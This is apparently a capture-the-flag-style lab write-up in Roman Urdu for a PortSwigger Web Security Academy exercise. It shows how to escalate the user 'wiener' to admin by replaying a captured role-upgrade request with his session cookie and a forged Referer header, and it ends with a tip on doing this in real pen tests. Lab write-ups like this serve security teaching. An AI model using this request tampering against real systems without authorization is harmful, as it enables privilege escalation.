# 🔓 Lab: Referer-Based Access Control

## 🎯 Goal:
wiener user ko admin banana by bypassing Referer-based access control.

### ✅ Step 1: Admin Login karo
Use credentials:

**username: administrator** 
**password: admin**

Admin panel open karo

carlos ko promote karo (admin bana do)

Jab promote ho jaye, us request ko Burp Suite → Repeater mein send karo

### ✅ Step 2: Repeater mein request analyze karo
Request kuch aise dikhegi:

**GET /admin-roles?username=carlos&action=upgrade HTTP/1.1**  
**Host: YOUR-LAB-ID.web-security-academy.net** 
**Referer: https://YOUR-LAB-ID.web-security-academy.net/admin**  
**Cookie: session=admin-session-id**

isky baad logout karo or dobara login page pr jao

Use credentials:

**username: wiener**  
**password: peter**

iss path sy **GET /my-account?id=wiener** session cookie copy karo

Repeater wali request modify karo
Cookie ko wiener wali session se replace karo

username=carlos ko change karo → username=wiener

Modified request kuch aise hoga:

**GET /admin-roles?username=wiener&action=upgrade HTTP/1.1** 
**Host: YOUR-LAB-ID.web-security-academy.net**  
**Referer: https://YOUR-LAB-ID.web-security-academy.net/admin**  
**Cookie: session=wiener-session-id**

### ✅ Step 5: Request send karo
Agar Referer header present hai aur session wiener ka hai, toh server samjhta hai ke request legit hai

Tumhara wiener user ab admin ban chuka hoga 🎉

# LAB SOLVED

### 💡 Real-Life Pen Testing Tip:
Jab bhi koi function referer check pe depend kare:

Tum simple Burp se Referer header inject karke unauthorized actions perform kar sakte ho

Yeh full control milne ka moka hota hai attacker ko
